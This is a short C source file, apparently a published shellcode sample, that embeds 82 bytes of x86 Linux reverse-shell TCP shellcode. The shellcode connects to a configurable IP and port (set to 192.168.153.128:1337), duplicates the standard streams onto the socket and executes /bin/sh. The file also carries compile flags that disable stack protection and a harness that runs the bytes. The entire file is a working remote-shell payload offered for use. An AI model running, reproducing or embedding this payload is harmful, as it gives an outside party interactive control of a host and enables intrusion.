/* 
 [+] Title     : Reverse Shell TCP
 [+] Author    : Muhann4d
 [+] Lenght    : 82
 [+] Arch      : Linux 86
 [+] IP & PORT : configurable
 [+] To compile: gcc -fno-stack-protector -z execstack shellcode.c -o your_shell_name
*/

#include<stdio.h>
#include<string.h>



#define PORT "\x05\x39" /*  PORT is 1337 (0539) */
#define IP "\xc0\xa8\x99\x80" /*  IP is 192.168.153.128 (c0a89980)  */



unsigned char code[] = \
"\x31\xc0\x89\xc3\x50\xb0\x66\x43\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc2\x31\xc0\xb0\x66\xb3\x03\x68"
IP
"\x66\x68"
PORT
"\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb1\x02\xb0"
"\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\x31\xc9"
"\x89\xca\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
